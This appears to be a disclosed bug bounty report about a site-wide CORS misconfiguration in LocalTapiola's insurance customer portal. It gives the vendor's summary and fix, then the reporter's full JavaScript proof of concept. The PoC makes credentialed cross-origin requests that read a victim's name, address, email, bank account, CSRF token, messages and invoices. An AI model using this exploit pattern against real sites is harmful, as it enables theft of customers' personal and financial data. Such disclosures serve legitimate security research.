title: CORS misconfiguration allows to steal customers data

profile.name: LocalTapiola
profile.about: LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services.

summaries.content:
##Issue
The reporter found an issue with CORS configurations in one of our applications. The misconfiguration allowed the hacker to leak and steal a logged on users information. Leaking much data would take quite some time, but it would also be a question of waiting for as many customets to log on without having to have any interaction on the hackers behalf, hence leaking a noticeable amount of data was found to be a reasonable threat.

##Fix

The CORS configuration was modified.

##Reasoning

The PoC provided was nice and we were easily able to verify the width and breadth of the issue. 

CORS allows for some neat things to be implemented, but also carries quite a few caveats. We have added CORS as one of our topics for our internal SDLC security training to avoid these issues as much as possible. Curious to see more about what we do internally? Have a peek at what we have made public: http://public.egate.fi/lahitapiola/lahitapiola/en/tiedostot/227331/
summaries.content_html:
Issue

The reporter found an issue with CORS configurations in one of our applications. The misconfiguration allowed the hacker to leak and steal a logged on users information. Leaking much data would take quite some time, but it would also be a question of waiting for as many customets to log on without having to have any interaction on the hackers behalf, hence leaking a noticeable amount of data was found to be a reasonable threat.

Fix

The CORS configuration was modified.

Reasoning

The PoC provided was nice and we were easily able to verify the width and breadth of the issue.

CORS allows for some neat things to be implemented, but also carries quite a few caveats. We have added CORS as one of our topics for our internal SDLC security training to avoid these issues as much as possible. Curious to see more about what we do internally? Have a peek at what we have made public: http://public.egate.fi/lahitapiola/lahitapiola/en/tiedostot/227331/

I found an interesting bug from the LocalTapiola's verkkopalvelu. This bug was a sitewide CORS misconfiguration. This misconfiguration allowed an attacker to bypass SOP and get READ and WRITE access to the logged customer's profiles.

After some interesting discussion the program handled the report very well and awarded me reasonable bounty.

The PoC code is quite long because I needed to prove the real impact of this vulnerability so I parsed all the critical customer information and logged it to the console. In the real-life scenario this data would be sent to the attacker's server.

However here is my PoC code (Yes I know - you could probably do a way cleaner PoC):

<!DOCTYPE html>
<meta charset="UTF-8"> 
<html>
<body>
<div id="demo">
</div>

<script>
function cors() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {

    //Let's make a variable called "parse"
    var parse = JSON.parse(this.responseText);

    //Parse the firstname and the lastname from the response
    var nimi = parse.etunimi+" "+parse.sukunimi;

    //Parse the address from the response
    var osoite = parse.yhteystiedot.lahiosoite;

    //Parse the email address from the response
    var mail = parse.yhteystiedot.sahkopostiosoite;

    //Parse the bank account from the response
    var tili = parse.tilit[0].tilinumero;

    //Let's make global variable called 'viesti' which we can write to the console â€“ In the real life scenario this data would be sent to the attacker's server. Also, echo some content to the web page.
    window.viesti = "Hei "+nimi+"<br>Osoitteesi on: "+osoite+"<br>SÃ¤hkÃ¶postiosoitteesi on: "+mail+"<br>Tilinumerosi on "+tili;
    console.log(viesti);

    //Small break and execute function called 'CSRF'    
    setTimeout(CSRF, 500); 
    }
    else{
    //This was to ensure that we can first trick the user to login and keep script running :)
    setTimeout(cors, 5000);
    }
  };
  xhttp.open("GET", "https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/api/asiakastiedot", true);
  xhttp.withCredentials = true;
  xhttp.send();
}
//In the first place let's wait two seconds so we can trick victim to log in
setTimeout(cors, 2000);


function CSRF() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = xhttp.responseText;
      function getMeta(metaName) {

      //CSRF token was at meta tag so let's steal it.
      const metas = document.getElementsByTagName('meta');
      for (let i = 0; i < metas.length; i++) {
            if (metas[i].getAttribute('name') === metaName) {
          return metas[i].getAttribute('content');
    }
  }
  return '';
}   

//Generate the global variable called 'token'. Which is basicly the value of the '_csrf' and write it to the console
window.token=getMeta('_csrf');
console.log("CSRF-token: "+token);
    }
  };
  xhttp.open("GET", "https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/kirjautunut/?lang=fi", true);
  xhttp.withCredentials = true;
  xhttp.send();

  //Small break and let's execute to the function called 'VIESTIT'
  setTimeout(VIESTIT, 500);  

} 


function VIESTIT() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
    var parse = JSON.parse(this.responseText);

    //Again some JSON parsing and reading all the 'ketjuID' and 'hash' values and put those as a value of the global variables 'ketju' and' hash'. After that let's execute 'VIESTIT2' function inside this for-loop

    for (var i = 0; i < parse.length; i++){
       window.ketju = parse[i].ketjuId;
       window.hash = parse[i].hash;
       VIESTIT2();
     }
    //After the for-loop is over let's execute the function called 'LASKUT'
    setTimeout(LASKUT, 500);
    }
  };
  xhttp.open("GET", "https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/api/viestit", true);
  xhttp.withCredentials = true;
  xhttp.send();
} 

function VIESTIT2() {
  var xhttp3 = new XMLHttpRequest();
  xhttp3.onreadystatechange = function() {
  if (this.readyState == 4 && this.status == 200) {

      //Get all the messages inside earlier for-loop in function VIESTIT and write the content to the console
      document.getElementById("demo").innerHTML = console.log(this.responseText);
    }
  };

  xhttp3.open("GET", "https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/api/viestit/"+ketju+"/?hash="+hash, true);
  xhttp3.withCredentials = true;
  xhttp3.send();
}

function LASKUT() {
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {

    //Parse some JSON with the for loop. What we want is to read right paths to the private invoices and get the hash values. Then we execute the function called 'LASKUT2' and get access to the content of the invoices.

    var parse = JSON.parse(this.responseText);

    //For loop for reading the content of the invoices.
    for (var i = 0; i < parse.laskut.length; i++){
    window.polku = parse.laskut[0].liite.polku;
    window.hash = parse.laskut[0].liite.hash;
    setTimeout(LASKUT2, 500)
    }
    }
  };
  xhttp.open("GET", "https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/api/laskut", true);
  xhttp.withCredentials = true;
  xhttp.send();
} 


function LASKUT2() {
  var xhttp3 = new XMLHttpRequest();
  xhttp3.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      document.getElementById("demo").innerHTML = console.log(this.responseText);
    }
  };
  xhttp3.open("GET", "https://verkkopalvelu.tapiola.fi/e2/verkkopalvelu/"+polku+"/?hash="+hash, true);
  xhttp3.withCredentials = true;
  xhttp3.send();
}


</script>
</body>
</html>
